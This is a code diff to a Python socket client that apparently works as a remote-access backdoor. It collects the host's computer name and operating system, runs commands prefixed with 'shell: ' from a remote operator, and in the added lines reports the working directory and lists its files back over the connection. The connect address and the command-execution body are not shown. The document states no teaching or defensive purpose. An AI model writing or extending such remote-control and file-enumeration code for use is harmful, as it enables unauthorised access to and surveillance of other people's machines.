@@ -1,5 +1,4 @@
-import socket, os, sys, time, base64, extra, platform, subprocess
-
+import socket, os, sys, time, base64, extra, platform, subprocess, pathlib
 data = [os.environ['COMPUTERNAME'], platform.system()]
 
 currentDirectory = os.getcwd()
@@ -54,6 +53,22 @@ while True:
 			if data == "disconnect":
 				active = False
 				print("Disconnecting Client")
+				conn.close()
+				continue
+
+			if data == "getCwd":
+				send(conn, currentDirectory)
+				continue
+
+			if data == "getFiles":
+				filesList = pathlib.Path(currentDirectory)
+				files = []
+				for file in filesList.iterdir():
+					files.append(file.name)
+
+				files = ",".join(files)
+
+				send(conn, files)
 				continue
 
 			if checkCommand(data, "shell: ")[0]:
@@ -77,3 +92,7 @@ while True:
 		except Exception as e:
 			print(e)
 			active = False
+			try:
+				conn.close()
+			except:
+				pass
